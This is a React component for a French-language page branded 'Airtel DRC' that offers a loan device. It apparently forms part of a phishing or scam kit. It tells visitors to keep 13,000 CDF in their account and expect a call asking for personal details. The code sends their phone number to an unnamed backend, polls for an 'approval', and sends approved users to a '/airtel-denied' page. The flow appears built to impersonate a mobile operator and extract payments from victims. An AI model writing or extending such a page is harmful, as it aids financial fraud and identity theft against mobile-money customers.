import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

function AirtelLoanLimit() {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  const stopPolling = () => {
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
  };

  const closeModal = () => {
    stopPolling();
    setIsProcessing(false);
    setStatusMessage('');
    setErrorMessage('');
  };

  const handleContinue = async () => {
    setIsProcessing(true);
    setErrorMessage('');
    setStatusMessage('Envoi de la demande...');

    const phone = localStorage.getItem('airtelPhone') || '';
    if (!phone) {
      navigate('/');
      return;
    }

    try {
      const res = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/request-loan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phone }),
      });
      const data = await res.json();

      if (data.status !== 'pending' || !data.approval_id) {
        setErrorMessage('Erreur lors de l\'envoi de la demande.');
        return;
      }

      setStatusMessage('En attente de l\'approbation...');
      const approvalId = data.approval_id;

      let attempts = 0;
      const maxAttempts = 60; // 2 minutes

      pollRef.current = setInterval(async () => {
        attempts++;

        // Timeout after 2 minutes
        if (attempts > maxAttempts) {
          stopPolling();
          setErrorMessage('Délai dépassé. Veuillez réessayer.');
          return;
        }

        try {
          const statusRes = await fetch(
            `${import.meta.env.VITE_API_BASE_URL}/api/loan-request-status/${approvalId}`
          );
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            stopPolling();
            setStatusMessage('Approuvé ! Redirection...');
            setTimeout(() => navigate('/airtel-denied'), 600);
          } else if (statusData.status === 'rejected') {
            stopPolling();
            // Clear session and redirect to login
            localStorage.removeItem('airtelPhone');
            localStorage.removeItem('loanLimit');
            setIsProcessing(false);
            setStatusMessage('');
            navigate('/');
          } else if (statusData.status === 'expired') {
            stopPolling();
            setErrorMessage('Session expirée. Veuillez réessayer.');
          }
        } catch {
          // Network hiccup — keep polling
        }
      }, 2000);
    } catch {
      setErrorMessage('Erreur de connexion au serveur.');
    }
  };

  return (
    <div className="airtel-container">
      {/* Header Section */}
      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel DRC</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. N'importe où.</p>
      </div>

      {/* Main White Card */}
      <div className="airtel-card">
        <button className="airtel-back-link" onClick={() => navigate(-1)} disabled={isProcessing}>
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
          </svg>
          Retour
        </button>

        <h2 className="airtel-limit-heading">Votre appareil de prêt</h2>
        <p className="airtel-limit-subtext">
          Voici les étapes à suivre pour obtenir votre appareil :
        </p>

        <div className="airtel-steps">
          <p className="airtel-step">
            1. Avant de cliquer sur « Demander », assurez-vous que votre compte
            Airtel dispose d'au moins 13 000 CDF. Dans le cas contraire, veuillez
            effectuer un dépôt.
          </p>
          <p className="airtel-step">
            2. Cliquez sur « Demander » si votre compte dispose d'au moins
            13 000 CDF.
          </p>
          <p className="airtel-step airtel-step-note">
            **Remarque : Aucun montant ne sera prélevé avant la réception de
            votre appareil.
          </p>
          <p className="airtel-step">
            3. Vous recevrez un appel du service client d'Airtel. Il vous sera
            demandé de fournir votre localisation ainsi que vos informations
            personnelles.
          </p>
          <p className="airtel-step">
            4. L'appareil vous sera livré, ou vous pourrez le récupérer dans
            notre magasin.
          </p>
        </div>

        <button
          className="airtel-continue-btn"
          onClick={handleContinue}
          disabled={isProcessing}
          style={isProcessing ? { backgroundColor: '#9CA3AF', cursor: 'wait' } : undefined}
        >
          {isProcessing ? 'Traitement en cours......' : 'Continuer pour obtenir le prêt'}
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12"></line>
            <polyline points="12 5 19 12 12 19"></polyline>
          </svg>
        </button>
      </div>

      {/* ---- PROCESSING MODAL ---- */}
      {isProcessing && (
        <div className="airtel-modal-overlay">
          <div className="airtel-modal">
            {/* Show error if any, otherwise show spinner + status */}
            {errorMessage ? (
              <>
                <div className="airtel-modal-icon airtel-modal-icon-error">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10"></circle>
                    <line x1="12" y1="8" x2="12" y2="12"></line>
                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                  </svg>
                </div>
                <h3 className="airtel-modal-title">Une erreur est survenue</h3>
                <p className="airtel-modal-subtext">{errorMessage}</p>
                <button className="airtel-modal-close-btn" onClick={closeModal}>
                  Fermer
                </button>
              </>
            ) : (
              <>
                <div className="airtel-modal-spinner" />
                <h3 className="airtel-modal-title">Traitement en cours...</h3>
                <p className="airtel-modal-subtext">
                  {statusMessage || 'Veuillez patienter...'}
                </p>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default AirtelLoanLimit;